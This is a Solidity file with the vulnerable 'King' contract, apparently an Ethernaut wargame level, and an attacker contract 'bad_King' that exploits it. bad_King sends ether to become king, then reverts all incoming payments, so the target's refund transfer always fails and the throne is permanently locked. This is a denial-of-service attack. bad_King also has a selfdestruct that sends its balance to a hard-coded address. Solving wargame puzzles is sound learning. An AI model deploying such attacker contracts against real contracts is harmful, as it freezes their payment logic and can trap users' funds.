// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract bad_King {
    
    
    
   constructor() public payable {
   
  }
  
  
    function attack(address _addr) public payable {
        address(_addr).call{gas: 21000, value: 1000000000000000000}("");
    
    }
   
    
    receive() external payable {
        revert();
    }
    
     function destroy() public  {
        selfdestruct(payable(0x2BF5A2f4E77Ced2F6456d1b839b8e46E0E8e34E2));
    }
    
} 
